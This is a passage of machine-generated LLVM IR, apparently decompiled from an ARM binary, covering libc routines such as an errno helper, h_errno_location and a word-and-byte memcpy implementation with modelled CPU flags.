dec_label_pc_c6c0:                                ; preds = %entry
  %v0_c6c0 = call i32 @__errno_location()
  %v0_c6c4 = load i32, i32* %r4.global-to-local, align 4
  %v1_c6c4 = sub i32 0, %v0_c6c4
  %v2_c6c8 = inttoptr i32 %v0_c6c0 to i32*
  store i32 %v1_c6c4, i32* %v2_c6c8, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_c6d0

dec_label_pc_c6d0:                                ; preds = %entry, %dec_label_pc_c6c0
  %v0_c6d0 = phi i32 [ %v0_c6b0, %entry ], [ -1, %dec_label_pc_c6c0 ]
  %v2_c6d4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_c6d4, i32* @r4, align 4
  ret i32 %v0_c6d0

; uselistorder directives
  uselistorder i32 %v0_c6b0, { 1, 0, 2 }
  uselistorder i32 ()* @wait4, { 1, 0 }
  uselistorder label %dec_label_pc_c6d0, { 1, 0 }
}

define i32 @__GI___h_errno_location() local_unnamed_addr {
entry:
  ret i32 ptrtoint (i32* @global_var_1bacc.217 to i32)
}

define i32 @_memcpy(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r1, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i8*, align 4
  %v0_c6f0 = load i32, i32* @r1, align 4
  %v1_c6f0 = load i32, i32* %r0.global-to-local, align 4
  %v2_c6f0 = sub i32 %v0_c6f0, %v1_c6f0
  %v3_c6f0 = icmp ult i32 %v0_c6f0, %v1_c6f0
  %v4_c6f0 = xor i32 %v1_c6f0, %v0_c6f0
  %v5_c6f0 = xor i32 %v2_c6f0, %v0_c6f0
  %v6_c6f0 = and i32 %v5_c6f0, %v4_c6f0
  %v7_c6f0 = icmp slt i32 %v6_c6f0, 0
  store i1 %v7_c6f0, i1* %cpsr_v.global-to-local, align 1
  %v8_c6f0 = icmp slt i32 %v2_c6f0, 0
  store i1 %v8_c6f0, i1* %cpsr_n.global-to-local, align 1
  %v9_c6f0 = icmp eq i32 %v0_c6f0, %v1_c6f0
  store i1 %v9_c6f0, i1* @cpsr_z, align 1
  br i1 %v3_c6f0, label %dec_label_pc_c93c, label %dec_label_pc_c6f8

dec_label_pc_c6f8:                                ; preds = %entry
  br i1 %v9_c6f0, label %.thread122, label %bb

.thread122:                                       ; preds = %bb145, %.thread121, %bb142, %dec_label_pc_c6f8
  %merge = phi i32 [ %v0_c6f0, %dec_label_pc_c6f8 ], [ %v2_c9d0, %bb142 ], [ %v11_c9ec, %bb145 ], [ %v7_c9ec, %.thread121 ]
  ret i32 %merge

bb:                                               ; preds = %dec_label_pc_c6f8
  %v5_c6fc = inttoptr i32 %v1_c6f0 to i8*
  store i8* %v5_c6fc, i8** %stack_var_-8, align 4
  %v0_c700 = load i32, i32* @r2, align 4
  %v2_c700 = add i32 %v0_c700, -4
  store i32 %v2_c700, i32* %r2.global-to-local, align 4
  %v4_c700 = sub i32 3, %v0_c700
  %v5_c700 = and i32 %v4_c700, %v0_c700
  %v6_c700 = icmp slt i32 %v5_c700, 0
  store i1 %v6_c700, i1* %cpsr_v.global-to-local, align 1
  %v7_c700 = icmp slt i32 %v2_c700, 0
  store i1 %v7_c700, i1* %cpsr_n.global-to-local, align 1
  %v5_c704 = icmp slt i32 %v0_c700, 4
  br i1 %v5_c704, label %bb132, label %dec_label_pc_c708

dec_label_pc_c708:                                ; preds = %bb
  %v1_c708 = urem i32 %v1_c6f0, 4
  store i32 %v1_c708, i32* %ip.global-to-local, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_c708 = icmp eq i32 %v1_c708, 0
  br i1 %v2_c708, label %dec_label_pc_c710, label %dec_label_pc_c7b4

dec_label_pc_c710:                                ; preds = %dec_label_pc_c708
  %v1_c710 = urem i32 %v0_c6f0, 4
  store i32 %v1_c710, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_c710 = icmp eq i32 %v1_c710, 0
  %extract.t = trunc i32 %v0_c6f0 to i2
  br i1 %v2_c710, label %dec_label_pc_c718, label %dec_label_pc_c7e4

dec_label_pc_c718:                                ; preds = %dec_label_pc_c710, %dec_label_pc_c7dc
  %v0_c73092 = phi i32 [ %v1_c6f0, %dec_label_pc_c710 ], [ %v0_c82c75, %dec_label_pc_c7dc ]
  %v0_c72c91 = phi i32 [ %v0_c6f0, %dec_label_pc_c710 ], [ %v0_c7dc, %dec_label_pc_c7dc ]
  %v0_c718 = phi i32 [ %v2_c700, %dec_label_pc_c710 ], [ %v2_c7d4, %dec_label_pc_c7dc ]
  %v2_c718 = add i32 %v0_c718, -8
  store i32 %v2_c718, i32* %r2.global-to-local, align 4
  %v4_c718 = sub i32 7, %v0_c718
  %v5_c718 = and i32 %v4_c718, %v0_c718
  %v6_c718 = icmp slt i32 %v5_c718, 0
  store i1 %v6_c718, i1* %cpsr_v.global-to-local, align 1
  %v7_c718 = icmp slt i32 %v2_c718, 0
  store i1 %v7_c718, i1* %cpsr_n.global-to-local, align 1
  %v5_c71c = icmp slt i32 %v0_c718, 8
  br i1 %v5_c71c, label %dec_label_pc_c76c, label %dec_label_pc_c720

dec_label_pc_c720:                                ; preds = %dec_label_pc_c718
  %v2_c720 = add i32 %v0_c718, -28
  store i32 %v2_c720, i32* %r2.global-to-local, align 4
  %v4_c720 = sub i32 27, %v0_c718
  %v5_c720 = and i32 %v4_c720, %v2_c718
  %v6_c720 = icmp slt i32 %v5_c720, 0
  store i1 %v6_c720, i1* %cpsr_v.global-to-local, align 1
  %v7_c720 = icmp slt i32 %v2_c720, 0
  store i1 %v7_c720, i1* %cpsr_n.global-to-local, align 1
  %v5_c724 = icmp slt i32 %v2_c718, 20
  br i1 %v5_c724, label %dec_label_pc_c758, label %dec_label_pc_c728

dec_label_pc_c728:                                ; preds = %dec_label_pc_c720
  %v0_c728 = load i32, i32* @r4, align 4
  store i32 %v0_c728, i32* %stack_var_-12, align 4
  br label %dec_label_pc_c72c

dec_label_pc_c72c:                                ; preds = %dec_label_pc_c72c.dec_label_pc_c72c_crit_edge, %dec_label_pc_c728
  %v0_c730 = phi i32 [ %v12_c738, %dec_label_pc_c72c.dec_label_pc_c72c_crit_edge ], [ %v0_c73092, %dec_label_pc_c728 ]
  %v0_c72c = phi i32 [ %v0_c72c.pre, %dec_label_pc_c72c.dec_label_pc_c72c_crit_edge ], [ %v0_c72c91, %dec_label_pc_c728 ]
  %v1_c72c = inttoptr i32 %v0_c72c to i32*
  %v2_c72c = load i32, i32* %v1_c72c, align 4
  store i32 %v2_c72c, i32* %r3.global-to-local, align 4
  %v3_c72c = add i32 %v0_c72c, 4
  %v4_c72c = inttoptr i32 %v3_c72c to i32*
  %v5_c72c = load i32, i32* %v4_c72c, align 4
  store i32 %v5_c72c, i32* %r4.global-to-local, align 4
  %v6_c72c = add i32 %v0_c72c, 8
  %v7_c72c = inttoptr i32 %v6_c72c to i32*
  %v8_c72c = load i32, i32* %v7_c72c, align 4
  store i32 %v8_c72c, i32* %ip.global-to-local, align 4
  %v9_c72c = add i32 %v0_c72c, 12
  %v10_c72c = inttoptr i32 %v9_c72c to i32*
  %v11_c72c = load i32, i32* %v10_c72c, align 4
  store i32 %v11_c72c, i32* %lr.global-to-local, align 4
  %v12_c72c = add i32 %v0_c72c, 16
  store i32 %v12_c72c, i32* %r1.global-to-local, align 4
  %v1_c730 = inttoptr i32 %v0_c730 to i32*
  store i32 %v2_c72c, i32* %v1_c730, align 4
  %v3_c730 = add i32 %v0_c730, 4
  %v4_c730 = inttoptr i32 %v3_c730 to i32*
  %v5_c730 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_c730, i32* %v4_c730, align 4
  %v6_c730 = add i32 %v0_c730, 8
  %v7_c730 = inttoptr i32 %v6_c730 to i32*
  %v8_c730 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v8_c730, i32* %v7_c730, align 4
  %v9_c730 = add i32 %v0_c730, 12
  %v10_c730 = inttoptr i32 %v9_c730 to i32*
  %v11_c730 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v11_c730, i32* %v10_c730, align 4
  %v12_c730 = add i32 %v0_c730, 16
  store i32 %v12_c730, i32* %r0.global-to-local, align 4
  %v0_c734 = load i32, i32* %r1.global-to-local, align 4
  %v1_c734 = inttoptr i32 %v0_c734 to i32*
  %v2_c734 = load i32, i32* %v1_c734, align 4
  store i32 %v2_c734, i32* %r3.global-to-local, align 4
  %v3_c734 = add i32 %v0_c734, 4
  %v4_c734 = inttoptr i32 %v3_c734 to i32*
  %v5_c734 = load i32, i32* %v4_c734, align 4
  store i32 %v5_c734, i32* %r4.global-to-local, align 4
  %v6_c734 = add i32 %v0_c734, 8
  %v7_c734 = inttoptr i32 %v6_c734 to i32*
  %v8_c734 = load i32, i32* %v7_c734, align 4
  store i32 %v8_c734, i32* @ip, align 4
  %v9_c734 = add i32 %v0_c734, 12
  %v10_c734 = inttoptr i32 %v9_c734 to i32*
  %v11_c734 = load i32, i32* %v10_c734, align 4
  store i32 %v11_c734, i32* @lr, align 4
  %v12_c734 = add i32 %v0_c734, 16
  store i32 %v12_c734, i32* @r1, align 4
  %v1_c738 = inttoptr i32 %v12_c730 to i32*
  store i32 %v2_c734, i32* %v1_c738, align 4
  %v3_c738 = add i32 %v0_c730, 20
  %v4_c738 = inttoptr i32 %v3_c738 to i32*
  %v5_c738 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_c738, i32* %v4_c738, align 4
  %v6_c738 = add i32 %v0_c730, 24
  %v7_c738 = inttoptr i32 %v6_c738 to i32*
  %v8_c738 = load i32, i32* @ip, align 4
  store i32 %v8_c738, i32* %v7_c738, align 4
  %v9_c738 = add i32 %v0_c730, 28
  %v10_c738 = inttoptr i32 %v9_c738 to i32*
  %v11_c738 = load i32, i32* @lr, align 4
  store i32 %v11_c738, i32* %v10_c738, align 4
  %v12_c738 = add i32 %v0_c730, 32
  store i32 %v12_c738, i32* %r0.global-to-local, align 4
  %v0_c73c = load i32, i32* %r2.global-to-local, align 4
  %v2_c73c = add i32 %v0_c73c, -32
  store i32 %v2_c73c, i32* %r2.global-to-local, align 4
  %v6_c740 = icmp slt i32 %v0_c73c, 32
  br i1 %v6_c740, label %dec_label_pc_c744, label %dec_label_pc_c72c.dec_label_pc_c72c_crit_edge

dec_label_pc_c72c.dec_label_pc_c72c_crit_edge:    ; preds = %dec_label_pc_c72c
  %v0_c72c.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_c72c

dec_label_pc_c744:                                ; preds = %dec_label_pc_c72c
  %v4_c744 = add i32 %v0_c73c, -16
  %v6_c744 = add i32 %v0_c73c, 2147483616
  %v7_c744 = and i32 %v4_c744, %v6_c744
  %v8_c744 = icmp slt i32 %v7_c744, 0
  store i1 %v8_c744, i1* %cpsr_v.global-to-local, align 1
  %v9_c744 = icmp slt i32 %v4_c744, 0
  store i1 %v9_c744, i1* %cpsr_n.global-to-local, align 1
  %v5_c748 = icmp slt i32 %v2_c73c, -16
  br i1 %v5_c748, label %.thread1, label %bb129

bb129:                                            ; preds = %dec_label_pc_c744
  %v6_c748 = load i32, i32* @r1, align 4
  %v7_c748 = inttoptr i32 %v6_c748 to i32*
  %v8_c748 = load i32, i32* %v7_c748, align 4
  store i32 %v8_c748, i32* %r3.global-to-local, align 4
  %v9_c748 = add i32 %v6_c748, 4
  %v10_c748 = inttoptr i32 %v9_c748 to i32*
  %v11_c748 = load i32, i32* %v10_c748, align 4
  store i32 %v11_c748, i32* %r4.global-to-local, align 4
  %v12_c748 = add i32 %v6_c748, 8
  %v13_c748 = inttoptr i32 %v12_c748 to i32*
  %v14_c748 = load i32, i32* %v13_c748, align 4
  store i32 %v14_c748, i32* @ip, align 4
  %v15_c748 = add i32 %v6_c748, 12
  %v16_c748 = inttoptr i32 %v15_c748 to i32*
  %v17_c748 = load i32, i32* %v16_c748, align 4
  store i32 %v17_c748, i32* @lr, align 4
  %v18_c748 = add i32 %v6_c748, 16
  store i32 %v18_c748, i32* @r1, align 4
  %v7_c74c = inttoptr i32 %v12_c738 to i32*
  store i32 %v8_c748, i32* %v7_c74c, align 4
  %v9_c74c = add i32 %v0_c730, 36
  %v10_c74c = inttoptr i32 %v9_c74c to i32*
  %v11_c74c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v11_c74c, i32* %v10_c74c, align 4
  %v12_c74c = add i32 %v0_c730, 40
  %v13_c74c = inttoptr i32 %v12_c74c to i32*
  %v14_c74c = load i32, i32* @ip, align 4
  store i32 %v14_c74c, i32* %v13_c74c, align 4
  %v15_c74c = add i32 %v0_c730, 44
  %v16_c74c = inttoptr i32 %v15_c74c to i32*
  %v17_c74c = load i32, i32* @lr, align 4
  store i32 %v17_c74c, i32* %v16_c74c, align 4
  %v18_c74c = add i32 %v0_c730, 48
  store i32 %v18_c74c, i32* %r0.global-to-local, align 4
  %v6_c750 = load i32, i32* %r2.global-to-local, align 4
  %v7_c750 = add i32 %v6_c750, -16
  store i32 %v7_c750, i32* %r2.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_c744, %bb129
  %v3_c760101 = phi i32 [ %v12_c738, %dec_label_pc_c744 ], [ %v18_c74c, %bb129 ]
  %v0_c75895 = phi i32 [ %v2_c73c, %dec_label_pc_c744 ], [ %v7_c750, %bb129 ]
  %v2_c754 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_c754, i32* @r4, align 4
  br label %dec_label_pc_c758

dec_label_pc_c758:                                ; preds = %dec_label_pc_c720, %.thread1
  %v3_c760100 = phi i32 [ %v0_c73092, %dec_label_pc_c720 ], [ %v3_c760101, %.thread1 ]
  %v0_c758 = phi i32 [ %v2_c720, %dec_label_pc_c720 ], [ %v0_c75895, %.thread1 ]
  %v1_c758 = add i32 %v0_c758, 20
  store i32 %v1_c758, i32* %r2.global-to-local, align 4
  %v3_c758 = sub i32 0, %v0_c758
  %v4_c758 = and i32 %v1_c758, %v3_c758
  %v5_c758 = icmp slt i32 %v4_c758, 0
  store i1 %v5_c758, i1* %cpsr_v.global-to-local, align 1
  %v6_c758 = icmp slt i32 %v1_c758, 0
  store i1 %v6_c758, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_c75c

dec_label_pc_c75c:                                ; preds = %.thread117, %dec_label_pc_c758
  %v0_c76c.pre148 = phi i32 [ %v0_c76c.pre, %.thread117 ], [ %v1_c758, %dec_label_pc_c758 ]
  %v3_c760 = phi i32 [ %v3_c76098118, %.thread117 ], [ %v3_c760100, %dec_label_pc_c758 ]
  %v1_c764 = phi i1 [ %v1_c768, %.thread117 ], [ %v5_c758, %dec_label_pc_c758 ]
  %v0_c764 = phi i1 [ %v0_c768, %.thread117 ], [ %v6_c758, %dec_label_pc_c758 ]
  %v2_c75c = xor i1 %v1_c764, %v0_c764
  br i1 %v2_c75c, label %.thread117, label %bb130

bb130:                                            ; preds = %dec_label_pc_c75c
  %v3_c75c = load i32, i32* @r1, align 4
  %v4_c75c = inttoptr i32 %v3_c75c to i32*
  %v5_c75c = load i32, i32* %v4_c75c, align 4
  store i32 %v5_c75c, i32* %r3.global-to-local, align 4
  %v6_c75c = add i32 %v3_c75c, 4
  %v7_c75c = inttoptr i32 %v6_c75c to i32*
  %v8_c75c = load i32, i32* %v7_c75c, align 4
  store i32 %v8_c75c, i32* @ip, align 4
  %v9_c75c = add i32 %v3_c75c, 8
  %v10_c75c = inttoptr i32 %v9_c75c to i32*
  %v11_c75c = load i32, i32* %v10_c75c, align 4
  store i32 %v11_c75c, i32* @lr, align 4
  %v12_c75c = add i32 %v3_c75c, 12
  store i32 %v12_c75c, i32* @r1, align 4
  %v4_c760 = inttoptr i32 %v3_c760 to i32*
  store i32 %v5_c75c, i32* %v4_c760, align 4
  %v6_c760 = add i32 %v3_c760, 4
  %v7_c760 = inttoptr i32 %v6_c760 to i32*
  %v8_c760 = load i32, i32* @ip, align 4
  store i32 %v8_c760, i32* %v7_c760, align 4
  %v9_c760 = add i32 %v3_c760, 8
  %v10_c760 = inttoptr i32 %v9_c760 to i32*
  %v11_c760 = load i32, i32* @lr, align 4
  store i32 %v11_c760, i32* %v10_c760, align 4
  %v12_c760 = add i32 %v3_c760, 12
  store i32 %v12_c760, i32* %r0.global-to-local, align 4
  %v3_c764 = load i32, i32* %r2.global-to-local, align 4
  %v4_c764 = add i32 %v3_c764, -12
  store i32 %v4_c764, i32* %r2.global-to-local, align 4
  %v6_c764 = sub i32 11, %v3_c764
  %v7_c764 = and i32 %v6_c764, %v3_c764
  %v8_c764 = icmp slt i32 %v7_c764, 0
  store i1 %v8_c764, i1* %cpsr_v.global-to-local, align 1
  %v9_c764 = icmp slt i32 %v4_c764, 0
  store i1 %v9_c764, i1* %cpsr_n.global-to-local, align 1
  br label %.thread117

.thread117:                                       ; preds = %dec_label_pc_c75c, %bb130
  %v0_c76c.pre = phi i32 [ %v4_c764, %bb130 ], [ %v0_c76c.pre148, %dec_label_pc_c75c ]
  %v3_c76098118 = phi i32 [ %v12_c760, %bb130 ], [ %v3_c760, %dec_label_pc_c75c ]
  %v1_c768 = phi i1 [ %v8_c764, %bb130 ], [ %v1_c764, %dec_label_pc_c75c ]
  %v0_c768 = phi i1 [ %v9_c764, %bb130 ], [ %v0_c764, %dec_label_pc_c75c ]
  %v2_c768 = xor i1 %v1_c768, %v0_c768
  br i1 %v2_c768, label %dec_label_pc_c76c, label %dec_label_pc_c75c

dec_label_pc_c76c:                                ; preds = %.thread117, %dec_label_pc_c718
  %v7_c77c = phi i32 [ %v0_c73092, %dec_label_pc_c718 ], [ %v3_c76098118, %.thread117 ]
  %v0_c76c = phi i32 [ %v2_c718, %dec_label_pc_c718 ], [ %v0_c76c.pre, %.thread117 ]
  %v2_c76c = add i32 %v0_c76c, 8
  store i32 %v2_c76c, i32* %r2.global-to-local, align 4
  %v4_c76c = sub i32 0, %v0_c76c
  %v5_c76c = and i32 %v2_c76c, %v4_c76c
  %v6_c76c = icmp slt i32 %v5_c76c, 0
  store i1 %v6_c76c, i1* %cpsr_v.global-to-local, align 1
  %v7_c76c = icmp slt i32 %v2_c76c, 0
  store i1 %v7_c76c, i1* %cpsr_n.global-to-local, align 1
  %v5_c770 = icmp slt i32 %v0_c76c, -8
  br i1 %v5_c770, label %bb132, label %dec_label_pc_c774

dec_label_pc_c774:                                ; preds = %dec_label_pc_c76c
  %v6_c774 = add i32 %v0_c76c, 4
  store i32 %v6_c774, i32* %r2.global-to-local, align 4
  %v8_c774 = sub i32 -5, %v0_c76c
  %v9_c774 = and i32 %v8_c774, %v2_c76c
  %v10_c774 = icmp slt i32 %v9_c774, 0
  store i1 %v10_c774, i1* %cpsr_v.global-to-local, align 1
  %v11_c774 = icmp slt i32 %v6_c774, 0
  store i1 %v11_c774, i1* %cpsr_n.global-to-local, align 1
  %v5_c778 = icmp slt i32 %v2_c76c, 4
  %v6_c778 = load i32, i32* @r1, align 4
  %v7_c778 = inttoptr i32 %v6_c778 to i32*
  %v8_c778 = load i32, i32* %v7_c778, align 4
  store i32 %v8_c778, i32* %r3.global-to-local, align 4
  %v10_c778 = add i32 %v6_c778, 4
  br i1 %v5_c778, label %.thread5, label %bb131

.thread5:                                         ; preds = %dec_label_pc_c774
  store i32 %v10_c778, i32* @r1, align 4
  %v8_c77c = inttoptr i32 %v7_c77c to i32*
  store i32 %v8_c778, i32* %v8_c77c, align 4
  %v9_c77c = load i32, i32* %r0.global-to-local, align 4
  %v10_c77c = add i32 %v9_c77c, 4
  store i32 %v10_c77c, i32* %r0.global-to-local, align 4
  %v0_c78c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb132

bb131:                                            ; preds = %dec_label_pc_c774
  %v10_c780 = inttoptr i32 %v10_c778 to i32*
  %v11_c780 = load i32, i32* %v10_c780, align 4
  store i32 %v11_c780, i32* @ip, align 4
  %v12_c780 = add i32 %v6_c778, 8
  store i32 %v12_c780, i32* @r1, align 4
  %v7_c784 = inttoptr i32 %v7_c77c to i32*
  store i32 %v8_c778, i32* %v7_c784, align 4
  %v9_c784 = add i32 %v7_c77c, 4
  %v10_c784 = inttoptr i32 %v9_c784 to i32*
  %v11_c784 = load i32, i32* @ip, align 4
  store i32 %v11_c784, i32* %v10_c784, align 4
  %v12_c784 = add i32 %v7_c77c, 8
  store i32 %v12_c784, i32* %r0.global-to-local, align 4
  %v6_c788 = load i32, i32* %r2.global-to-local, align 4
  %v7_c788 = add i32 %v6_c788, -4
  store i32 %v7_c788, i32* %r2.global-to-local, align 4
  br label %bb132

bb132:                                            ; preds = %.thread5, %.thread11, %dec_label_pc_c76c, %bb, %dec_label_pc_c934, %dec_label_pc_c8c8, %dec_label_pc_c85c, %bb131
  %v2_c79c = phi i32 [ %v10_c77c, %.thread5 ], [ %v0_c82c75, %.thread11 ], [ %v7_c77c, %dec_label_pc_c76c ], [ %v1_c6f0, %bb ], [ %v2_c79c113, %dec_label_pc_c934 ], [ %v2_c79c112, %dec_label_pc_c8c8 ], [ %v2_c79c111, %dec_label_pc_c85c ], [ %v12_c784, %bb131 ]
  %v0_c78c = phi i32 [ %v0_c78c.pre, %.thread5 ], [ %v2_c7d4, %.thread11 ], [ %v2_c76c, %dec_label_pc_c76c ], [ %v2_c700, %bb ], [ %v0_c78c109, %dec_label_pc_c934 ], [ %v0_c78c108, %dec_label_pc_c8c8 ], [ %v0_c78c107, %dec_label_pc_c85c ], [ %v7_c788, %bb131 ]
  %v1_c78c = add i32 %v0_c78c, 4
  store i32 %v1_c78c, i32* @r2, align 4
  %v3_c78c = sub i32 0, %v0_c78c
  %v4_c78c = and i32 %v1_c78c, %v3_c78c
  %v5_c78c = icmp slt i32 %v4_c78c, 0
  store i1 %v5_c78c, i1* %cpsr_v.global-to-local, align 1
  %v6_c78c = icmp slt i32 %v1_c78c, 0
  store i1 %v6_c78c, i1* %cpsr_n.global-to-local, align 1
  %v7_c78c = icmp eq i32 %v1_c78c, 0
  store i1 %v7_c78c, i1* @cpsr_z, align 1
  br i1 %v7_c78c, label %bb133, label %bb134

bb133:                                            ; preds = %bb132
  %v3_c790 = load i8*, i8** %stack_var_-8, align 4
  %v4_c790 = ptrtoint i8* %v3_c790 to i32
  store i32 %v4_c790, i32* %r0.global-to-local, align 4
  ret i32 %v4_c790

bb134:                                            ; preds = %bb132
  %v1_c794 = add i32 %v0_c78c, 2
  %v3_c794 = sub i32 -3, %v0_c78c
  %v4_c794 = and i32 %v3_c794, %v1_c78c
  %v5_c794 = icmp slt i32 %v4_c794, 0
  store i1 %v5_c794, i1* %cpsr_v.global-to-local, align 1
  %v6_c794 = icmp slt i32 %v1_c794, 0
  store i1 %v6_c794, i1* %cpsr_n.global-to-local, align 1
  %v7_c794 = icmp eq i32 %v1_c78c, 2
  store i1 %v7_c794, i1* @cpsr_z, align 1
  %v0_c798 = load i32, i32* @r1, align 4
  %v1_c798 = inttoptr i32 %v0_c798 to i8*
  %v2_c798 = load i8, i8* %v1_c798, align 1
  %v3_c798 = zext i8 %v2_c798 to i32
  store i32 %v3_c798, i32* %r3.global-to-local, align 4
  %v5_c798 = add i32 %v0_c798, 1
  store i32 %v5_c798, i32* @r1, align 4
  %v3_c79c = inttoptr i32 %v2_c79c to i8*
  store i8 %v2_c798, i8* %v3_c79c, align 1
  %v4_c79c = load i32, i32* %r0.global-to-local, align 4
  %v5_c79c = add i32 %v4_c79c, 1
  store i32 %v5_c79c, i32* %r0.global-to-local, align 4
  %v0_c7a0 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_c7a0 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_c7a0 = xor i1 %v0_c7a0, %v1_c7a0
  br i1 %v2_c7a0, label %.thread119, label %bb135

bb135:                                            ; preds = %bb134
  %v3_c7a0 = load i32, i32* @r1, align 4
  %v4_c7a0 = inttoptr i32 %v3_c7a0 to i8*
  %v5_c7a0 = load i8, i8* %v4_c7a0, align 1
  %v6_c7a0 = zext i8 %v5_c7a0 to i32
  store i32 %v6_c7a0, i32* %r3.global-to-local, align 4
  %v8_c7a0 = add i32 %v3_c7a0, 1
  store i32 %v8_c7a0, i32* @r1, align 4
  %v6_c7a4 = inttoptr i32 %v5_c79c to i8*
  store i8 %v5_c7a0, i8* %v6_c7a4, align 1
  %v7_c7a4 = load i32, i32* %r0.global-to-local, align 4
  %v8_c7a4 = add i32 %v7_c7a4, 1
  store i32 %v8_c7a4, i32* %r0.global-to-local, align 4
  %v1_c7a8.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_c7a8.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread119

.thread119:                                       ; preds = %bb134, %bb135
  %v7_c7ac = phi i32 [ %v8_c7a4, %bb135 ], [ %v5_c79c, %bb134 ]
  %v2_c7ac = phi i1 [ %v2_c7a8.pre, %bb135 ], [ %v1_c7a0, %bb134 ]
  %v1_c7ac = phi i1 [ %v1_c7a8.pre, %bb135 ], [ %v0_c7a0, %bb134 ]
  %v0_c7a8 = load i1, i1* @cpsr_z, align 1
  %v3_c7a8 = xor i1 %v2_c7ac, %v1_c7ac
  %v4_c7a8 = or i1 %v0_c7a8, %v3_c7a8
  br i1 %v4_c7a8, label %.thread120, label %bb136

bb136:                                            ; preds = %.thread119
  %v5_c7a8 = load i32, i32* @r1, align 4
  %v6_c7a8 = inttoptr i32 %v5_c7a8 to i8*
  %v7_c7a8 = load i8, i8* %v6_c7a8, align 1
  %v8_c7a8 = zext i8 %v7_c7a8 to i32
  store i32 %v8_c7a8, i32* %r3.global-to-local, align 4
  %v10_c7a8 = add i32 %v5_c7a8, 1
  store i32 %v10_c7a8, i32* @r1, align 4
  %v8_c7ac = inttoptr i32 %v7_c7ac to i8*
  store i8 %v7_c7a8, i8* %v8_c7ac, align 1
  %v9_c7ac = load i32, i32* %r0.global-to-local, align 4
  %v10_c7ac = add i32 %v9_c7ac, 1
  store i32 %v10_c7ac, i32* %r0.global-to-local, align 4
  br label %.thread120

.thread120:                                       ; preds = %.thread119, %bb136
  %v2_c7b0 = load i8*, i8** %stack_var_-8, align 4
  %v3_c7b0 = ptrtoint i8* %v2_c7b0 to i32
  store i32 %v3_c7b0, i32* %r0.global-to-local, align 4
  ret i32 %v3_c7b0

dec_label_pc_c7b4:                                ; preds = %dec_label_pc_c708
  %v1_c7b4 = sub nsw i32 4, %v1_c708
  store i32 %v1_c7b4, i32* @ip, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_c7b8 = icmp ult i32 %v1_c7b4, 2
  store i1 %v8_c7b8, i1* %cpsr_n.global-to-local, align 1
  %v1_c7bc = inttoptr i32 %v0_c6f0 to i8*
  %v2_c7bc = load i8, i8* %v1_c7bc, align 1
  %v3_c7bc = zext i8 %v2_c7bc to i32
  store i32 %v3_c7bc, i32* %r3.global-to-local, align 4
  %v5_c7bc = add i32 %v0_c6f0, 1
  store i32 %v5_c7bc, i32* @r1, align 4
  store i8 %v2_c7bc, i8* %v5_c6fc, align 1
  %v4_c7c0 = load i32, i32* %r0.global-to-local, align 4
  %v5_c7c0 = add i32 %v4_c7c0, 1
  store i32 %v5_c7c0, i32* %r0.global-to-local, align 4
  br i1 %v8_c7b8, label %.thread11, label %bb137

bb137:                                            ; preds = %dec_label_pc_c7b4
  %v9_c7b8 = icmp eq i32 %v1_c7b4, 2
  %v6_c7c4 = load i32, i32* @r1, align 4
  %v7_c7c4 = inttoptr i32 %v6_c7c4 to i8*
  %v8_c7c4 = load i8, i8* %v7_c7c4, align 1
  %v9_c7c4 = zext i8 %v8_c7c4 to i32
  store i32 %v9_c7c4, i32* %r3.global-to-local, align 4
  %v11_c7c4 = add i32 %v6_c7c4, 1
  store i32 %v11_c7c4, i32* @r1, align 4
  %v9_c7c8 = inttoptr i32 %v5_c7c0 to i8*
  store i8 %v8_c7c4, i8* %v9_c7c8, align 1
  %v10_c7c8 = load i32, i32* %r0.global-to-local, align 4
  %v11_c7c8 = add i32 %v10_c7c8, 1
  store i32 %v11_c7c8, i32* %r0.global-to-local, align 4
  br i1 %v9_c7b8, label %.thread11, label %bb138

bb138:                                            ; preds = %bb137
  %v8_c7cc = load i32, i32* @r1, align 4
  %v9_c7cc = inttoptr i32 %v8_c7cc to i8*
  %v10_c7cc = load i8, i8* %v9_c7cc, align 1
  %v11_c7cc = zext i8 %v10_c7cc to i32
  store i32 %v11_c7cc, i32* %r3.global-to-local, align 4
  %v13_c7cc = add i32 %v8_c7cc, 1
  store i32 %v13_c7cc, i32* @r1, align 4
  %v11_c7d0 = inttoptr i32 %v11_c7c8 to i8*
  store i8 %v10_c7cc, i8* %v11_c7d0, align 1
  %v12_c7d0 = load i32, i32* %r0.global-to-local, align 4
  %v13_c7d0 = add i32 %v12_c7d0, 1
  store i32 %v13_c7d0, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb137, %dec_label_pc_c7b4, %bb138
  %v0_c82c75 = phi i32 [ %v11_c7c8, %bb137 ], [ %v5_c7c0, %dec_label_pc_c7b4 ], [ %v13_c7d0, %bb138 ]
